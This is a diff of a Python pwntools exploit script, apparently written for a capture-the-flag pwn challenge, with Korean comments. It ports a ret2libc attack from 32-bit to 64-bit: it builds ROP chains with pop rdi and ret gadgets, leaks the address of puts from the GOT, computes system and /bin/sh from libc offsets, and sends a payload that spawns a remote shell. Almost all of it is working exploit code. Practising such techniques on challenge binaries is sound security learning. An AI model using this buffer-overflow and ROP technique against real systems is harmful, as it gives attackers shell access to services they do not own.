@@ -3,9 +3,13 @@ from pwn import *
 context.terminal=['tmux', 'splitw', '-h']
 
 #p = process("./prob2")
-p = remote("fsi.zzado.kr", 9933)
-e = ELF("./03 Pwn/prob3")
+p = remote("fsi.zzado.kr", 9936)
+e = ELF("./03 Pwn/prob6")
 lib = ELF('./03 Pwn/libc.so.6')
+
+r = ROP(e)
+pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = r.find_gadget(['ret'])[0]
 
 puts_plt = e.plt['puts']
 puts_got = e.got['puts']
@@ -20,34 +24,35 @@ main = e.symbols['main']
 p.recv()
 # puts의 GOT를 구함
 payload =  b'a' * 0x20
-payload += b'b' * 0x4
-
-payload += p32(puts_plt)
-payload += p32(main)
-payload += p32(puts_got)
+payload += b'b' * 0x8
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
 p.send(payload)
 
 
 ## Leak libc
 p.recvuntil(b'\n')
-leak_data = u32(p.recv()[:4]) # 현재 실행중인 프로세스의 puts()의 GOT 주소를 알아냄
+leak_data = u64(p.recv()[:6] + b"\x00\x00") # 현재 실행중인 프로세스의 puts()의 GOT 주소를 알아냄
 # 원본 라이브러리 puts()의 GOT 주소를 빼면 현재 프로세스 GOT의 시작 주소를 알 수 있음
 
-# puts  	000732A0	
-# system	00048170	
-# /bin/sh   001BD0D5
-# puts와 system의 차이 : 0x2B130
-# puts와 /bin/sh의 차이 : 0x149E35
+# puts  	80E50	
+# system	50D70	
+# /bin/sh   1D8678
+# puts와 system의 차이 : 0x300E0
+# puts와 /bin/sh의 차이 : 0x157828
 
-system = leak_data - 0x2B130
-binsh = leak_data + 0x149E35
+system = leak_data - 0x300E0
+binsh = leak_data + 0x157828
 
 ## system("/bin/bash")
 payload =  b'a' * 0x20
-payload += b'b' * 0x4
-payload += p32(system)
-payload += p32(main)
-payload += p32(binsh)
+payload += b'b' * 0x8
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(ret_gadget) # stack alignment
+payload += p64(system)
 p.send(payload)
 
 p.interactive() 
